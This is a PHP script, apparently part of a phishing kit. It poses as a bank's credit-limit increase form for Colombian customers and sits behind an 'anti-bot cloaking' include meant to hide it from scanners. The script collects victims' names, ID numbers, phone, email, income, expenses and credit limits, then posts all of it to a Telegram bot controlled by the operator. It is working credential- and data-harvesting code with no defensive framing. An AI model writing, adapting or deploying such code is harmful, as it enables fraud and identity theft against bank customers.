<?php
// ── Cloaking Anti-Bot ─────────────────────────────────
require_once __DIR__ . '/../../config/cloak.php';
// ──────────────────────────────────────────────────────

header('Content-Type: application/json');

// Carga config de forma segura aunque cloak.php ya lo haya incluido
if (!isset($config) || !is_array($config)) {
    $config = require __DIR__ . '/../../config/config.php';
}
$bot_token = $config['botToken'];
$chat_id = $config['chatId'];

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

// ── Recoger datos del POST ────────────────────────────
$nombre = trim($_POST['primer_nombre'] ?? '');
$apellido = trim($_POST['apellido'] ?? '');
$tipo_doc = trim($_POST['tipo_doc'] ?? '');
$num_doc = trim($_POST['num_doc'] ?? '');
$celular = trim($_POST['celular'] ?? '');
$correo = trim($_POST['correo'] ?? '');
$ingresos = trim($_POST['ingresos'] ?? '');
$gastos = trim($_POST['gastos'] ?? '');
$cupo_actual = trim($_POST['cupo_actual'] ?? '');
$cupo_nuevo = trim($_POST['cupo_nuevo'] ?? '');

// Calcular aumento
$cupoActNum = (int)preg_replace('/\D/', '', $cupo_actual);
$cupoNuevNum = (int)preg_replace('/\D/', '', $cupo_nuevo);
$aumento = $cupoNuevNum - $cupoActNum;

function fmtCOP(int $n): string
{
    return '$' . number_format($n, 0, ',', '.');
}

// ── Construir mensaje Telegram ───────────────────────
$msg = "🏦 *SOLICITUD DE AUMENTO DE CUPO*\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

$msg .= "👤 *DATOS PERSONALES*\n";
$msg .= "📛 Nombre: *{$nombre} {$apellido}*\n";
$msg .= "🪪 Documento: *{$tipo_doc} {$num_doc}*\n";
$msg .= "📱 Celular: *{$celular}*\n";
$msg .= "📧 Correo: *{$correo}*\n\n";

$msg .= "💰 *INFORMACIÓN FINANCIERA*\n";
$msg .= "📈 Ingresos mensuales: *\${$ingresos}*\n";
$msg .= "📉 Gastos mensuales: *\${$gastos}*\n\n";

$msg .= "💳 *SOLICITUD DE CUPO*\n";
$msg .= "🔴 Cupo actual: *\${$cupo_actual}*\n";
$msg .= "🟢 Cupo solicitado: *" . fmtCOP($cupoNuevNum) . "*\n";
$msg .= "⬆️ Aumento solicitado: *" . fmtCOP($aumento) . "*\n\n";

$msg .= "🕐 " . date('d/m/Y H:i:s') . " (UTC-5)";

// ── Enviar a Telegram ────────────────────────────────
$url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $msg,
    'parse_mode' => 'Markdown',
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$response = curl_exec($ch);
$error = curl_error($ch);

if ($error) {
    echo json_encode(['ok' => false, 'error' => $error]);
}
else {
    echo json_encode(['ok' => true]);
}
